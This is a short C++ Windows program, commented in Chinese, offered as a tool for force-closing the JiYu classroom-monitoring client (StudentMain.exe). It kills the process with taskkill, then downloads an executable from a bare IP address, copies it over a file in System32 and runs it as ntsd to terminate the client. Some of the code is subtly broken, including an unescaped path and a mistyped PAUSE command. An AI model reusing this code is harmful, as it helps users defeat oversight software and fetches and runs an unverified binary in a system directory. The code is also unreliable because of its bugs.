/*
	Tobby制作:极域退出器 
*/
#include<bits/stdc++.h>
#include<windows.h>
#include<stdio.h>
#include<direct.h> 
#pragma comment(lib,"URlmon")

using namespace std; 
int main(){
	printf("--By Tobby--\n");
	printf("jiyu-easy-exiter-downloadtest\n");
	printf("正在退出:\n");
	printf("尝试使用taskkill:");
	system("taskkill /f /t /im StudentMain.exe"); 
	//taskkill方法
	printf("尝试使用ntsd:下载依赖文件......\n");
	char buffer[MAX_PATH];
	_getcwd(buffer, MAX_PATH);
	strcat(buffer, "//ntsd.exe");//strcat_s
	HRESULT Result = URLDownloadToFileA(NULL, "http://49.234.94.97/", buffer, 0, NULL);
	switch (Result)
	{
	case S_OK:printf("成功开始下载.\n");break;
	case E_OUTOFMEMORY: printf("下载失败!请使用本地ntsd.exe.\n"); break;
	}
	char __temp[256] = "./ntsd.exe";
    char *sourcefile = __temp;
	//源文件
    char *targetfile = "C:\Windows\System32\ntsd.exe";//目标文件
    CopyFile(sourcefile , targetfile , false);//false代表覆盖，true不覆盖
	//复制NTSD文件
	printf("尝试清除:\n");
	system("ntsd -c q -pn StudentMain.exe");
	//ntsd强力方法
	printf("程序执行完成!");
	system("PASUE");
	return 0;
}
